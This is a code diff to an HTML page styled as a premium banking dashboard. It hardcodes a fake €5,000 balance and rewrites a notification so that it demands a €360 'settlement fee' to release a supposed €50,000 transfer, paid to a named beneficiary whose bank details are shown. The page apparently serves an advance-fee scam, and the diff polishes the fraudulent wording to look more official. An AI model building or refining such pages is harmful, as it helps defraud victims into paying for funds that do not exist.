@@ -89,7 +89,7 @@ button:hover{transform:translateY(-3px);}
 </div>
 <div class="dashboard" id="dashboard" style="display:none;">
 <div class="profile"><div class="avatar">👤</div><div><div id="welcomeUser">riez</div><div class="small">Premium Member</div></div><div style="margin-left:auto;cursor:pointer;font-size:20px;opacity:0.7;" onclick="logout()" title="Logout">🚪</div></div>
-<div class="balance-card"><div class="small">Available Balance</div><div class="balance" id="balanceDisplay">€0.00</div><div class="card-number">MOON • PREMIUM ACCOUNT</div><div class="glow-circle"></div></div>
+<div class="balance-card"><div class="small">Available Balance</div><div class="balance" id="balanceDisplay">€5,000.00</div><div class="card-number">MOON • PREMIUM ACCOUNT</div><div class="glow-circle"></div></div>
 <div class="actions">
 <div class="action"><div class="icon">💰</div>Deposit</div>
 <div class="action" onclick="openWithdrawModal()"><div class="icon">🏦</div>Withdraw</div>
@@ -145,11 +145,11 @@ button:hover{transform:translateY(-3px);}
 </div>
 </div>
 <div class="bottom">
-<div class="nav active">🏠<<div>Home</div></div>
-<div class="nav">💳<<div>Wallet</div></div>
-<div class="nav">📈<<div>Market</div></div>
-<div class="nav">🎁<<div>Rewards</div></div>
-<div class="nav">👤<<div>Profile</div></div>
+<div class="nav active">🏠<div>Home</div></div>
+<div class="nav">💳<div>Wallet</div></div>
+<div class="nav">📈<div>Market</div></div>
+<div class="nav">🎁<div>Rewards</div></div>
+<div class="nav">👤<div>Profile</div></div>
 </div>
 </div>
 <div class="page" id="notificationPage" style="display:none;padding-bottom:110px;">
@@ -163,14 +163,14 @@ button:hover{transform:translateY(-3px);}
 <div style="display:flex;align-items:center;gap:15px;margin-bottom:15px;">
 <div style="width:50px;height:50px;background:rgba(251,191,36,.2);border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:24px;">🔔</div>
 <div>
-<div style="font-size:16px;font-weight:600;">DEAL CLOSURE</div>
+<div style="font-size:16px;font-weight:600;">FUND SETTLEMENT</div>
 <div class="small">Today • 25/5/2026</div>
 </div>
 </div>
 <div style="padding:15px;background:rgba(0,0,0,.2);border-radius:16px;margin-top:10px;">
 <div style="font-size:14px;line-height:1.7;opacity:.9;">
-For this deal closure to be done you need to complete the deal closure which is <span style="color:#fbbf24;font-weight:700;">€358</span><br><br>
-This is a deal closure for the €50k transfer to this specific bank<br><br>
+For this fund settlement to be completed, a settlement fee of <span style="color:#fbbf24;font-weight:700;">€360</span> is required.<br><br>
+This settlement covers the processing and final release of the €50,000 transfer to the designated bank account.<br><br>
 <span style="color:#fbbf24;font-weight:700;">Euro</span><br>
 Begunstigde<br>
 Aris Adrianus Cornelis Groenendijk<br><br>
@@ -242,7 +242,7 @@ CHASDEFX
 </div>
 </div>
 <script>
-let currentBalance = 0.00;
+let currentBalance = 5000.00;
 let selectedMethod = 'paypal';
 function createAccount(){
 let name=document.getElementById("name").value;
@@ -389,10 +389,10 @@ function closeNotificationAlert(){document.getElementById("notificationAlert").s
 <div class="alert-overlay" id="notificationAlert">
 <div class="alert-box">
 <div class="alert-icon">🔔</div>
-<div class="alert-title">DEAL CLOSURE</div>
+<div class="alert-title">FUND SETTLEMENT</div>
 <div class="alert-text">
-For this deal closure to be done you need to complete the deal closure which is <span class="alert-highlight">€358</span><br><br>
-This is a deal closure for the €50k transfer to this specific bank<br><br>
+For this fund settlement to be completed, a settlement fee of <span class="alert-highlight">€360</span> is required.<br><br>
+This settlement covers the processing and final release of the €50,000 transfer to the designated bank account.<br><br>
 Euro<br>
 Begunstigde<br>
 Aris Adrianus Cornelis Groenendijk<br><br>
